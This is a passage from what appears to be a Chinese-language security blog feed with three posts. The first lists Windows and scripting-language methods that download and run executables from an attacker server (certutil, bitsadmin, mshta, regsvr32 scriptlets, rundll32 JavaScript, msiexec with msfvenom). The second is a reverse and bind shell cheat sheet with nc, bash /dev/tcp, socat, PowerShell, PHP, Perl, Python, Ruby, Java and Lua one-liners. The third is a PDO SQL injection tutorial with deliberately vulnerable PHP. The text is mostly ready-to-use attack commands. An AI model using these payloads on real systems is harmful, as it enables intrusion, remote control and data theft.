&gt;&gt;download.vbsecho aGet.Mode = 3 &gt;&gt;download.vbsecho aGet.Type = 1 &gt;&gt;download.vbsecho aGet.Open() &gt;&gt;download.vbsecho aGet.Write(Post.responseBody) &gt;&gt;download.vbsecho aGet.SaveToFile &quot;C:\tmp\xxx.exe&quot;,2 &gt;&gt;download.vbs</code></pre><h2 id="5-3、wget-vbs"><a href="#5-3、wget-vbs" class="headerlink" title="5.3、wget.vbs"></a>5.3、wget.vbs</h2><pre><code>on error resume nextiLocal=LCase(Wscript.Arguments(1))iRemote=LCase(Wscript.Arguments(0))iUser=LCase(Wscript.Arguments(2))iPass=LCase(Wscript.Arguments(3))set xPost=CreateObject(&quot;Microsoft.XMLHTTP&quot;)if iUser=&quot;&quot; and iPass=&quot;&quot; thenxPost.Open &quot;GET&quot;,iRemote,0elsexPost.Open &quot;GET&quot;,iRemote,0,iUser,iPassend ifxPost.Send()set sGet=CreateObject(&quot;ADODB.Stream&quot;)sGet.Mode=3sGet.Type=1sGet.Open()sGet.Write xPost.ResponseBodysGet.SaveToFile iLocal,2</code></pre><p>cscript wget.vbs <a href="http://10.10.101.222:8000/xxx.exe" target="_blank" rel="noopener">http://10.10.101.222:8000/xxx.exe</a></p><h1 id="6、CSC-exe"><a href="#6、CSC-exe" class="headerlink" title="6、CSC.exe"></a>6、CSC.exe</h1><p>CSC.exe是windows自带的C#编译器<br>CSC.exe路径需要绝对路径，且路径根据.net版本而定<br>download.cs：（利用echo依次写入如下内容）</p><pre><code>using System.Net;namespace downloader{    class Program    {    static void Main(string[] args)    {        WebClient client = new WebClient();        string URLAddress = @&quot;http://10.10.101.222:8000/xxx.exe&quot;;        string receivePath = @&quot;C:\tmp\&quot;;        client.DownloadFile(URLAddress, receivePath + System.IO.Path.GetFileName(URLAddress));    } }}</code></pre><p>执行：<br>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /out:C:\tmp\download.exe C:\tmp\download.cs</p><h1 id="7、记事本文件下载"><a href="#7、记事本文件下载" class="headerlink" title="7、记事本文件下载"></a>7、记事本文件下载</h1><p>notepad中:<br>打开–&gt;输入URL （win10 不支持？？？）</p><h1 id="8、JScript下载"><a href="#8、JScript下载" class="headerlink" title="8、JScript下载"></a>8、JScript下载</h1><p>.js文件内容</p><pre><code>var Object = WScript.CreateObject(&quot;MSXML2.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if (Object.Status == 200){   var Stream = WScript.CreateObject(&quot;ADODB.Stream&quot;);   Stream.Open();   Stream.Type = 1;   Stream.Write(Object.ResponseBody);   Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;, 2);Stream.Close();}</code></pre><p>执行： node download.js<br>或<br>合并成一句话形式：也就是rundll32</p><pre><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if(Object.Status==200){Stream=new ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;,2);Stream.Close();}</code></pre><h1 id="9、bitsadmin"><a href="#9、bitsadmin" class="headerlink" title="9、bitsadmin"></a>9、bitsadmin</h1><p>不支持https,ftp协议，使用SimpleHttpServer会报错</p><pre><code>bitsadmin /transfer n http://10.10.101.222:8000\xxx.exe  C:\tmp\xxx.exe</code></pre><h1 id="10、Certutil"><a href="#10、Certutil" class="headerlink" title="10、Certutil"></a>10、Certutil</h1><pre><code>certutil.exe -urlcache -split -f http://10.10.101.222:8000/xxx.exe xxx.exe  ###下载文件certutil -urlcache -split -f http://10.10.101.222:8000/xxx.exe delete   ###删除缓存</code></pre><h1 id="11、msiexec-（远程执行）"><a href="#11、msiexec-（远程执行）" class="headerlink" title="11、msiexec  （远程执行）"></a>11、msiexec  （远程执行）</h1><p><a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msiexec-exe-multiple-methods/" target="_blank" rel="noopener" title="msiexec白名单bypass">https://www.hackingarticles.in/bypass-application-whitelisting-using-msiexec-exe-multiple-methods/</a></p><pre><code>msfvenom -p windows/exec CMD=cmd.exe -f msi &gt; evil.msimsiexec /q /i http://10.10.101.222:8000/evil.msi</code></pre><h1 id="12、IEExec"><a href="#12、IEExec" class="headerlink" title="12、IEExec"></a>12、IEExec</h1><pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; caspol -s off   ####需管理员身份C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt; IEExec http://10.10.101.222:8000/xxx.exe</code></pre><h1 id="13、mshta"><a href="#13、mshta" class="headerlink" title="13、mshta"></a>13、mshta</h1><pre><code>mshta http://10.10.101.222/run.hta</code></pre><p>run.hta</p><pre><code>&lt;HTML&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; &lt;HEAD&gt; &lt;script language=&quot;VBScript&quot;&gt; Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(&quot;Wscript.Shell&quot;) objShell.Run &quot;cmd.exe /c net user&quot; // 这里填写命令 self.close &lt;/script&gt;     &lt;body&gt; demo &lt;/body&gt; &lt;/HEAD&gt;&lt;/HTML&gt;</code></pre><h1 id="14、rundll32"><a href="#14、rundll32" class="headerlink" title="14、rundll32"></a>14、rundll32</h1><pre><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();Object=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);Object.open(&quot;GET&quot;,&quot;http://10.10.101.222:8000/xxx.exe&quot;,false);Object.send();if(Object.Status==200){Stream=new ActiveXObject(&quot;ADODB.Stream&quot;);Stream.Open();Stream.Type=1;Stream.Write(Object.ResponseBody);Stream.SaveToFile(&quot;C:\\tmp\\xxx.exe&quot;,2);Stream.Close();}</code></pre><h1 id="15、regsvr32："><a href="#15、regsvr32：" class="headerlink" title="15、regsvr32："></a>15、regsvr32：</h1><p><a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/" target="_blank" rel="noopener" title="regsvr32白名单bypass">https://www.hackingarticles.in/bypass-application-whitelisting-using-regsrv32-exe-multiple-methods/</a></p><pre><code>regsvr32 /u /s /i:http://10.10.101.222:8000/run.sct scrobj.dll</code></pre><p>run.sct:</p><pre><code>&lt;?XML version=&quot;1.0&quot;?&gt; &lt;scriptlet&gt; &lt;registration         progid=&quot;ShortJSRAT&quot;         classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;         &lt;!-- Learn from Casey Smith @subTee --&gt;         &lt;script language=&quot;JScript&quot;&gt;                 &lt;![CDATA[                         ps  = &quot;cmd.exe /c calc.exe&quot;;   ####命令执行                      new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);                     ]]&gt; &lt;/script&gt; &lt;/registration&gt;&lt;/scriptlet&gt;</code></pre><h1 id="常见编程环境下载"><a href="#常见编程环境下载" class="headerlink" title="常见编程环境下载"></a>常见编程环境下载</h1><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="1、命令行版本"><a href="#1、命令行版本" class="headerlink" title="1、命令行版本"></a>1、命令行版本</h2><pre><code>python -c &quot;import urllib2;u=urllib2.urlopen(&quot;http://xx.xxx.xx/filename&quot;);localfile=open(&apos;c:\tmp\filename&apos;,&apos;w&apos;);localfile.write(u.read());localfile.close();&quot;</code></pre><h2 id="2、脚本执行版本"><a href="#2、脚本执行版本" class="headerlink" title="2、脚本执行版本"></a>2、脚本执行版本</h2><pre><code>#!python#!/usr/bin/pythonimport urllib2u = urllib2.urlopen(&apos;http://domain/file&apos;)localFile = open(&apos;local_file&apos;, &apos;w&apos;)    localFile.write(u.read())localFile.close()</code></pre><p>kali@kali:~# python test.py</p><h2 id="3、通过python脚本构造任意文件上传页面："><a href="#3、通过python脚本构造任意文件上传页面：" class="headerlink" title="3、通过python脚本构造任意文件上传页面："></a>3、通过python脚本构造任意文件上传页面：</h2><p> <a href="https://0day.work/finding-an-arbitrary-file-upload-vulnerability-in-a-filesharing-script/" target="_blank" rel="noopener" title="SimpleHTTPServer文件上传版本">https://0day.work/finding-an-arbitrary-file-upload-vulnerability-in-a-filesharing-script/</a></p><h1 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h1><h2 id="1、命令行版本-1"><a href="#1、命令行版本-1" class="headerlink" title="1、命令行版本"></a>1、命令行版本</h2><pre><code>perl -MLWP::Simple -e &apos;getstore (&quot;http://xx.xx.xx.xx/filename&quot;,&quot;filename&quot;)&apos;</code></pre><p>2、脚本执行</p><pre><code>#!/usr/bin/perluse LWP::Simple;getstore(&quot;http://domain/file&quot;, &quot;file&quot;);</code></pre><p>kali@kali:~# perl test.pl</p><h1 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h1><pre><code>#!ruby#!/usr/bin/rubyrequire &apos;net/http&apos;Net::HTTP.start(&quot;www.domain.com&quot;) { |http|r = http.get(&quot;/file&quot;)open(&quot;save_location&quot;, &quot;wb&quot;) { |file|file.write(r.body)}}</code></pre><p>kali@kali:~# ruby test.rb</p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>1、命令行</p><pre><code>php -r &apos;$data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);$f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);fwrite($f, $data[0]);fclose($f);&apos;</code></pre><p>2、脚本执行</p><pre><code>&lt;?php $data = @file(&quot;http://10.10.14.67:8000/winPEAS.exe&quot;);$f = fopen(&quot;/tmp/winPEAS.exe&quot;, &quot;w&quot;);fwrite($f, $data[0]);fclose($f);?&gt;</code></pre><p>kali@kali:~# php test.php</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;这里我分为三个模块：Linux、Windows、常见语言环境&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;#Linux#&lt;/p&gt;
&lt;h1 id=&quot;1、curl&quot;&gt;&lt;a href=&quot;#1、curl&quot; class=&quot;headerlink&quot; title=&quot;1、curl&quot;&gt;&lt;/
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Rerverse_shell&amp;Interactive_shell</title>
    <link href="https://github.com/2020/04/19/Rerverse-shell-Interactive-shell/"/>
    <id>https://github.com/2020/04/19/Rerverse-shell-Interactive-shell/</id>
    <published>2020-04-19T12:38:26.000Z</published>
    <updated>2020-04-19T12:39:09.332Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1、NC"><a href="#1、NC" class="headerlink" title="1、NC"></a>1、NC</h1><h2 id="1-1、NC-reverse-shell"><a href="#1-1、NC-reverse-shell" class="headerlink" title="1.1、NC reverse shell"></a>1.1、NC reverse shell</h2><p>1.1.1、-e参数（目标机器上执行）</p><pre><code>nc  《attack_ip》 《attack_port》 -e /bin/bash  </code></pre><p>1.1.2、没有-e参数（目标机器上执行）</p><pre><code>[1]/bin/sh | nc 《attack_ip》 《attack_port》[2] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 《attack_ip》 《attack_port》 &gt; /tmp/f   ###OpenBsd[3]nc -c bash 《attack_ip》 《attack_port》</code></pre><p>nc -lvvp attack_port  ###攻击机上执行</p><h2 id="1-2、NC-Bind-shell"><a href="#1-2、NC-Bind-shell" class="headerlink" title="1.2、NC Bind shell"></a>1.2、NC Bind shell</h2><pre><code>nc -lvvp 4444 -e /bin/bash  ###目标机器上执行nc victim_ip 4444    ###攻击机器执行</code></pre><h1 id="2-BASH"><a href="#2-BASH" class="headerlink" title="2.BASH"></a>2.BASH</h1><h2 id="2-1、bash-tcp"><a href="#2-1、bash-tcp" class="headerlink" title="2.1、bash tcp"></a>2.1、bash tcp</h2><pre><code>bash -i&gt;＆/dev/tcp/《attack_ip》/《attack_port》 0&gt;＆1  ###目标机器上执行nc -lvvp attack_port   ###攻击机上执行</code></pre><h2 id="2-2、bash-udp"><a href="#2-2、bash-udp" class="headerlink" title="2.2、bash udp"></a>2.2、bash udp</h2><p>目标机器上执行：  </p><pre><code>bash -i &gt;&amp; /dev/udp/《attack_ip》/《attack_port》 0&gt;&amp;1  ###目标机器上执行nc -u -lvp 《aattack_port》  ####攻击机上执行</code></pre><p>同样可以尝试其他类型shell：sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p><h1 id="3、Socat"><a href="#3、Socat" class="headerlink" title="3、Socat"></a>3、Socat</h1><pre><code>socat file:`tty`,raw,echo=0 TCP-L:《attack_port》  ####攻击机上执行socat exec:&apos;bash -li&apos;,pty,stderr,setsid,sigint,sane tcp:《attack_ip》:《attack_port》 ###目标机器上执行</code></pre><p>有些机器没有socat，需下载到目标机器：<a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat</a> </p><h1 id="4、Telnet"><a href="#4、Telnet" class="headerlink" title="4、Telnet"></a>4、Telnet</h1><p>目标机器：</p><pre><code>telnet 《attack_ip》80 | /bin/bash | telnet 192.168.2.6 443</code></pre><p>攻击机：</p><pre><code>nc -lv 80nc -lv 443</code></pre><h1 id="5、Powershell"><a href="#5、Powershell" class="headerlink" title="5、Powershell"></a>5、Powershell</h1><p>[1]</p><pre><code>powershell -nop -exec bypass -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&apos;《attack_ip》&apos;,《attack_port》);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &apos;PS &apos; + (pwd).Path + &apos;&gt; &apos;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></pre><p>[2]Nishang : Invoke-PowerShellTcp.ps1</p><pre><code>powershell iex (New-Object Net.WebClient).DownloadString(&apos;http://&lt;yourwebserver&gt;/Invoke-PowerShellTcp.ps1&apos;);Invoke-PowerShellTcp -Reverse -IPAddress 《attack_ip》 -Port 《attack_port》</code></pre><h1 id="常见语言环境反弹shell"><a href="#常见语言环境反弹shell" class="headerlink" title="常见语言环境反弹shell"></a>常见语言环境反弹shell</h1><p>PHP</p><pre><code>[1]php -r &apos;$sock=fsockopen(&quot;《attack_ip》&quot;,《attack_port》);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;[2]php -r &apos;$sock=fsockopen(&quot;《attack_ip》&quot;,《attack_port》);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&apos;</code></pre><p>Perl</p><pre><code>perl -e &apos;use Socket;$i=&quot;《attack_ip》&quot;;$p=《attack_port》;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos;</code></pre><p>Python</p><pre><code>python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;《attack_ip》&quot;,《attack_port》));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><p>Ruby</p><pre><code>ruby -rsocket -e&apos;f=TCPSocket.open(&quot;《attack_ip》&quot;,《attack_port》).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</code></pre><p>JAVA</p><pre><code>r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/《attack_ip》/《attack_port》;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()</code></pre><p>Lua</p><pre><code>lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;《attack_ip》&apos;,&apos;《attack_port》&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</code></pre><p>###linux only</p><h1 id="交互式shell："><a href="#交互式shell：" class="headerlink" title="交互式shell："></a>交互式shell：</h1><h2 id="1-监听时使用rlwrap"><a href="#1-监听时使用rlwrap" class="headerlink" title="[1]监听时使用rlwrap"></a>[1]监听时使用rlwrap</h2><pre><code>rlwrap nc -lvvp 4444</code></pre><h2 id="2-使用socat"><a href="#2-使用socat" class="headerlink" title="[2]使用socat"></a>[2]使用socat</h2><pre><code>socat file:`tty`,raw,echo=0 tcp-listen:4444</code></pre><h2 id="3-Spawn-a-TTY-shell-from-an-interpreter"><a href="#3-Spawn-a-TTY-shell-from-an-interpreter" class="headerlink" title="[3]Spawn a TTY shell from an interpreter:"></a>[3]Spawn a TTY shell from an interpreter:</h2><p>/bin/sh -i<br>python -c ‘import pty; pty.spawn(“/bin/sh”)’<br>python3 -c ‘import pty; pty.spawn(“/bin/sh”)’<br>perl -e ‘exec “/bin/sh”;’</p><h2 id="4-升级为tty-shell"><a href="#4-升级为tty-shell" class="headerlink" title="[4]升级为tty shell"></a>[4]升级为tty shell</h2><p>ctrl+z<br>stty raw -echo<br>fg   ###这里输入不会显示，输入之后直接Enter即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1、NC&quot;&gt;&lt;a href=&quot;#1、NC&quot; class=&quot;headerlink&quot; title=&quot;1、NC&quot;&gt;&lt;/a&gt;1、NC&lt;/h1&gt;&lt;h2 id=&quot;1-1、NC-reverse-shell&quot;&gt;&lt;a href=&quot;#1-1、NC-reverse-shell&quot; cla
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>PDO&amp;&amp;InjectionBypass</title>
    <link href="https://github.com/2020/02/21/PDO&amp;&amp;InjectionBypass/"/>
    <id>https://github.com/2020/02/21/PDO&amp;&amp;InjectionBypass/</id>
    <published>2020-02-21T11:34:45.899Z</published>
    <updated>2020-02-21T18:21:45.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-PDO-amp-Injection-Bypass"><a href="#PHP-PDO-amp-Injection-Bypass" class="headerlink" title="PHP PDO &amp; Injection Bypass"></a><strong>PHP PDO &amp; Injection Bypass</strong></h1><p>PDO：PHP 数据对象<br>  PHP访问数据库定义了一个轻量级的一致接口。<br>  PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据。<br>  使用预处理和存储过程</p><p>PDO连接MySql数据库：</p><pre><code>&lt;?php$dbms=&apos;mysql&apos;; //数据库类型$host=&apos;127.0.0.1&apos;; //数据库主机名$port=&apos;3306&apos;;  //数据库端口$dbName=&apos;test&apos;;//使用的数据库$user=&apos;root&apos;;  //数据库连接用户名$pass=&apos;root&apos;;  //对应的密码$dsn=&quot;$dbms:host=$host;port=$port;dbname=$dbName&quot;;   try { $dbh = new PDO($dsn, $user, $pass); //初始化一个PDO对象 echo &quot;连接成功&lt;br/&gt;&quot;;/*你还可以进行一次搜索操作foreach ($dbh-&gt;query(&apos;SELECT * from FOO&apos;) as $row) {print_r($row); //你可以用 echo($GLOBAL); 来看到这些值}*/$dbh = null;} catch (PDOException $e) {die (&quot;Error!: &quot; . $e-&gt;getMessage() . &quot;&lt;br/&gt;&quot;);}//默认这个不是长连接，如果需要数据库长连接，需要最后加一个参数：array(PDO::ATTR_PERSISTENT =&gt; true) 变成这样：$db = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));?&gt;</code></pre><p>PDO多语句安全问题：<br>使用PDO中query()函数同数据库交互：</p><pre><code>&lt;?php$dbms=&apos;mysql&apos;;$host=&apos;127.0.0.1&apos;;$dbName=&apos;test&apos;;$user=&apos;root&apos;;$pass=&apos;root&apos;;$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;try { $pdo = new PDO($dsn, $user, $pass);} catch (PDOException $e) { echo $e;}$sql = &quot;select * from user where id=1;&quot;;$sql .= &quot;create table test2 like user&quot;;$stmt = $pdo-&gt;query($sql);while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)){var_dump($row);echo &quot;&quot;;}</code></pre><p>PDO默认支持多语句查询，如果php版本小于5.5.21或者创建PDO实例时未设置PDO::MYSQL_ATTR_MULTI_STATEMENTS为false时可能会造成堆叠注入</p><pre><code>&lt;?php$dbms=&apos;mysql&apos;;$host=&apos;127.0.0.1&apos;;$dbName=&apos;test&apos;;$user=&apos;root&apos;;$pass=&apos;root&apos;;$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;try { $pdo = new PDO($dsn, $user, $pass);} catch (PDOException $e) { echo $e;}$id = $_GET[&apos;id&apos;];$sql = &quot;SELECT * from user where id =&quot;.$id;$stmt = $pdo-&gt;query($sql);while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)){var_dump($row);echo &quot;&quot;;}?&gt;</code></pre><p>$id变量可控，以形成堆叠注入</p><p><img src="./../../../../images/01.png" alt=""></p><p>禁止多语句执行：</p><pre><code>new PDO($dsn, $user, $pass, array( PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; false))</code></pre><p>PDO预处理安全问题<br>    PDO分为模拟预处理和非模拟预处理。<br>    模拟预处理是防止某些数据库不支持预处理而设置的，在初始化PDO驱动时，可以设置一项参数,PDO::ATTR_EMULATE_PREPARES，作用是打开模拟预处理(true)或者关闭(false),默认为true。PDO内部会模拟参数绑定的过程，SQL语句是在最后execute()的时候才发送给数据库执行。<br>    非模拟预处理则是通过数据库服务器来进行预处理动作，主要分为两步：第一步是prepare阶段，发送SQL语句模板到数据库服务器；第二步通过execute()函数发送占位符参数给数据库服务器进行执行。</p><p>[1]模拟预处理动态拼接形成多语句执行（PHP&lt;5.3.6）</p><pre><code>&lt;?php$dbms=&apos;mysql&apos;;$host=&apos;127.0.0.1&apos;;$dbName=&apos;test&apos;;$user=&apos;root&apos;;$pass=&apos;root&apos;;$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;try {$pdo = new PDO($dsn, $user, $pass);} catch (PDOException $e) {echo $e;}//$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false);$username = $_GET[&apos;username&apos;];$sql = &quot;select id,&quot;.$_GET[&apos;field&apos;].&quot; from user where username = ?&quot;;$stmt = $pdo-&gt;prepare($sql);$stmt-&gt;bindParam(1,$username);$stmt-&gt;execute();while($row=$stmt-&gt;fetch(PDO::FETCH_ASSOC)){var_dump($row);echo &quot;&quot;;}?&gt;   </code></pre><p>可以看到sql语句field字段可控，这样我们构造field，达到多语句执行的效果。</p><p><img src="./../../../../images/02.png" alt=""></p><p>数据库中语句为：</p><pre><code>select id,username from user;create table sss like user;select id from user where username=Z</code></pre><p>[2]模拟预处理报错注入(PHP&lt;5.3.6)<br>   上述代码，设置$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION); //打印报错信息<br>   同样可以达到报错注入效果<br><img src="./../../../../images/03.png" alt=""></p><p>在数据库中语句为：</p><pre><code>select id,updatexml(1,concat(user(),0x7e,version()),1) from user;select id from user where username=Z</code></pre><p>[3]非模拟预处理报错注入<br>   设置pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); //表示是否使用PHP本地模拟prepare<br>   ：php对sql语句发送采用了prepare–execute方式，php对sql语句发送采用了prepare–execute方式<br>   此时转义处理交由mysql server来执行，变量和SQL模板是分两次发送的<br>   因此虽然field字段依旧可控，但是多语句不可执行<br>   当设置$pdo-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);时，仍然可以进行报错注入<br><img src="./../../../../images/04.png" alt=""><br>在数据库中语句为：<br>    select id,updatexml(1,concat(user(),0x7e),1) from user where username=Y;<br>这里可进行报错注入是因为MySQL服务端prepare时报错，然后通过设置PDO::ATTR_ERRMODE将MySQL错误信息打印<br>在MySQL中执行prepare语句<br>    prepare statm from “select id,updatexml(0x7e,concat(0x7e,user(),0x7e),0x7e) from user where username=?”;</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PHP-PDO-amp-Injection-Bypass&quot;&gt;&lt;a href=&quot;#PHP-PDO-amp-Injection-Bypass&quot; class=&quot;headerlink&quot; title=&quot;PHP PDO &amp;amp; Injection Bypass&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
    
  </entry>
  
</feed>
